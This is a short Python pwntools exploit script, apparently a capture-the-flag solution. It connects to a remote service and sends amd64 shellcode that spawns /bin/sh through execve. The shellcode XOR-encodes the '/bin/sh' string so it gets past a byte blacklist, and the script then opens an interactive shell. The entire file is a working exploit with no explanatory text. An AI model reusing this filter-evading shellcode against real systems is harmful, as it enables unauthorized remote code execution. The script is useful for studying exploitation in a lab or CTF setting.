#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./execute',checksec=False)

#p = process()
p = remote('94.237.59.180',32981)
#gdb.attach(p,gdbscript='''
#            brva 0x000000000000134f
#            brva 0x000000000000139b
#            ''')
input()
blacklist = b"\x3b\x54\x62\x69\x6e\x73\x68\xf6\xd2\xc0\x5f\xc9\x66\x6c\x61\x67"



shellcode = asm('''
                    mov rax, 0x2a2a2a2a2a2a2a2a
                    push rax

                    mov rax, 0x2a2a2a2a2a2a2a2a ^ 0x68732f6e69622f
                    xor [rsp],rax
                    mov rdi,rsp

                    push 0x0
                    pop rsi
                    push 0x0 
                    pop rdx
                    push 0x3a
                    pop rax

                    add al,1
                    syscall
                ''',arch='amd64')

for byte in shellcode:
    
    if byte in blacklist:
        print(f"Bad byte -->> 0x{byte:02x}")
        print(f'ASCII -->> {chr(byte)}')


p.sendafter(b'everything\n',shellcode)

p.interactive()
